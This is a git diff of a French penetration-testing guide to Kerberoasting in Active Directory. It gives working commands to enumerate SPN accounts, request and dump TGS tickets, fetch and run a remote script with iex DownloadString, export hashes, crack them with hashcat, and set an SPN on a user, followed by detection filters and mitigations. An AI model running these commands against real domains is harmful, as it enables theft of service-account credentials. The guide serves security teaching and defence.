@@ -1,6 +1,7 @@
 ## Kerberoast
 
-Le but de la technique de **Kerberoasting** est de collecter des tickets TGS pour les services qui s'exécutent au nom des comptes d'utilisateurs dans l'AD, et non des comptes d'ordinateurs. Ainsi, une partie de ces tickets TGS sont chiffrés avec des clés dérivées des mots de passe des utilisateurs. Par conséquent, leurs informations d'identification pourraient être craquées hors ligne. Vous pouvez savoir qu'un compte d'utilisateur est utilisé comme service car la propriété "ServicePrincipalName" n'est pas nulle.
+Le but de la technique de **Kerberoasting** est de collecter des tickets TGS pour les services qui s'exécutent au nom des comptes d'utilisateurs dans l'AD, et non des comptes d'ordinateurs. Ainsi, une **partie** de ces tickets TGS sont **chiffrés** avec des **clés** dérivées des mots de passe des utilisateurs. Par conséquent, leurs informations d'identification pourraient être **craquées hors ligne**.\
+Vous pouvez savoir qu'un compte d'**utilisateur** est utilisé comme un **service** car la propriété **"ServicePrincipalName"** n'est **pas nulle**.
 
 Par conséquent, pour effectuer Kerberoasting, seul un compte de domaine qui peut demander des TGS est nécessaire, ce qui peut être n'importe qui car aucun privilège spécial n'est requis.
 
@@ -9,7 +10,7 @@ Par conséquent, pour effectuer Kerberoasting, seul un compte de domaine qui peu
 ### **Attaque**
 
 {% hint style="warning" %}
-Les outils de **Kerberoasting** demandent généralement le chiffrement **`RC4`** lors de l'attaque et de l'initialisation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
+Les outils de **Kerberoasting** demandent généralement le **`chiffrement RC4`** lors de l'exécution de l'attaque et de l'initialisation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
 Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que les AES-256 (type 18) commencent par **`$krb5tgs$18$*`**`.
 {% endhint %}
 
@@ -28,11 +29,11 @@ setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-* **Technique 1 : Demander le TGS et le récupérer depuis la mémoire**
+* **Technique 1 : Demander le TGS et le décharger de la mémoire**
 ```powershell
 #Get TGS in memory from a single user
-Add-Type -AssemblyName System.IdentityModel 
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local
 
 #Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
 setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
@@ -65,7 +66,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-Lorsqu'un TGS est demandé, l'événement Windows `4769 - Un ticket de service Kerberos a été demandé` est généré.
+Lorsqu'un TGS est demandé, l'événement Windows `4769 - Une demande de ticket de service Kerberos a été effectuée` est généré.
 {% endhint %}
 
 
@@ -73,7 +74,7 @@ Lorsqu'un TGS est demandé, l'événement Windows `4769 - Un ticket de service K
 ![](<../../.gitbook/assets/image (9) (1) (2).png>)
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
 Obtenez l'accès aujourd'hui:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -88,26 +89,28 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 
 Si vous avez **suffisamment de permissions** sur un utilisateur, vous pouvez le rendre **kerberoastable** :
 ```bash
- Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
 Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Si vous rencontrez cette **erreur** depuis Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** c'est à cause de votre heure locale, vous devez synchroniser l'hôte avec le DC: `ntpdate <IP du DC>`
+Si vous rencontrez cette **erreur** depuis Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** c'est à cause de votre heure locale, vous devez synchroniser l'hôte avec le DC. Il y a quelques options:
+- `ntpdate <IP du DC>` - Déconseillé depuis Ubuntu 16.04
+- `rdate -n <IP du DC>`
 
 ### Atténuation
 
-Kerberoast est très furtif s'il est exploitable
+Kerberoast est très discret s'il est exploitable
 
 * ID d'événement de sécurité 4769 - Un ticket Kerberos a été demandé
 * Étant donné que 4769 est très fréquent, filtrons les résultats:
-  * Le nom du service ne doit pas être krbtgt
-  * Le nom du service ne se termine pas par $ (pour filtrer les comptes machine utilisés pour les services)
-  * Le nom du compte ne doit pas être machine@domain (pour filtrer les demandes provenant de machines)
-  * Le code d'erreur est '0x0' (pour filtrer les échecs, 0x0 est un succès)
-  * Plus important encore, le type de chiffrement du ticket est 0x17
+* Le nom du service ne doit pas être krbtgt
+* Le nom du service ne se termine pas par $ (pour filtrer les comptes machine utilisés pour les services)
+* Le nom du compte ne doit pas être machine@domain (pour filtrer les demandes provenant de machines)
+* Le code d'erreur doit être '0x0' (pour filtrer les échecs, 0x0 est un succès)
+* Le type de chiffrement du ticket est surtout 0x17
 * Atténuation:
-  * Les mots de passe des comptes de service doivent être difficiles à deviner (plus de 25 caractères)
-  * Utilisez des comptes de service gérés (changement automatique de mot de passe périodique et gestion déléguée des SPN)
+* Les mots de passe du compte de service doivent être difficiles à deviner (plus de 25 caractères)
+* Utilisez des comptes de service gérés (changement automatique de mot de passe périodique et gestion déléguée des SPN)
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
